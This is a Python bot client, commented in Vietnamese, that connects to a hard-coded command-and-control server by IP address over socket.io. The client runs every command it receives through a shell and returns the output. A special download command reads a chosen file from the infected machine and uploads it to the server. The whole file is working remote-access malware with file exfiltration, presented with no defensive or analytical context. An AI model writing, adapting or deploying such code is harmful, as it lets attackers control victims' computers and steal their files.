import socketio
import subprocess
import os
import requests

sio = socketio.Client()
C2_SERVER_URL = 'http://172.93.163.140:3000'

@sio.on('executeCommand')
def on_command(command):
    # Xử lý lệnh rút file đặc biệt
    if command.startswith("__DOWNLOAD__ "):
        file_path = command.replace("__DOWNLOAD__ ", "").strip()
        if os.path.exists(file_path):
            sio.emit('botResponse', f"[*] Đang đẩy file {os.path.basename(file_path)} lên server...")
            try:
                with open(file_path, 'rb') as f:
                    # Gửi file qua HTTP POST
                    files = {'file': f}
                    r = requests.post(f"{C2_SERVER_URL}/bot-upload", files=files)
                    if r.status_code == 200:
                        sio.emit('botResponse', f"[+] Thành công! Link tải: {C2_SERVER_URL}/admin-download/{os.path.basename(file_path)}")
                    else:
                        sio.emit('botResponse', "[!] Server từ chối file.")
            except Exception as e:
                sio.emit('botResponse', f"[!] Lỗi upload: {str(e)}")
        else:
            sio.emit('botResponse', "[!] File không tồn tại trên Bot.")
        return

    # Các lệnh CMD bình thường khác
    try:
        res = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        sio.emit('botResponse', res[:500])
    except Exception as e:
        sio.emit('botResponse', f"Lỗi: {str(e)}")

if __name__ == '__main__':
    sio.connect(f"{C2_SERVER_URL}?type=bot")
    sio.wait()
